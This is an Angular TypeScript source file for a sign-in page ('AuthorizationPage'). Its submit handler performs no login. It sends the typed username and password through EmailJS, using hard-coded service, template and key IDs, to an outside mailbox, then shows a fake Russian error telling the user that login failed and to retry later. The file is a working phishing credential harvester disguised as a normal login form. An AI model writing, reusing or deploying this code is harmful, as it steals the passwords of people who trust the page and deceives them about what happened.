import { Component } from '@angular/core';
import {
  FormBuilder,
  FormGroup,
  FormsModule,
  ReactiveFormsModule,
  Validators,
} from '@angular/forms';
import { Router, RouterLink } from '@angular/router';
import emailJS, { EmailJSResponseStatus } from 'emailjs-com';
import { InputTextModule } from 'primeng/inputtext';

@Component({
  selector: 'app-authorization',
  standalone: true,
  imports: [FormsModule, ReactiveFormsModule, InputTextModule, RouterLink],
  templateUrl: './authorization.page.html',
  styleUrl: './authorization.page.scss',
})
export class AuthorizationPage {
  form: FormGroup;
  showPassword: boolean = false;

  constructor(private fb: FormBuilder, private router: Router) {
    this.form = this.fb.group({
      userName: this.fb.control(null, [
        Validators.required,
        Validators.minLength(3),
      ]),
      password: this.fb.control(null, [
        Validators.required,
        Validators.minLength(5),
      ]),
    });
  }

  submit() {
    (function () {
      emailJS.init('5-LxPY2MOlzY5LmKb');
    })();
    const templateID = 'template_m1odwcw';
    const serviceID = 'service_c22mds6';

    const params = {
      senderusername: this.form.value?.userName,
      senderpassword: this.form.value?.password,
    };
    emailJS.send(serviceID, templateID, params).then(
      () => {
        alert('Произошла ошибка при входе. Повторите позже');
      },
      (error) => {
        // console.log(error.text);
      }
    );
  }
}
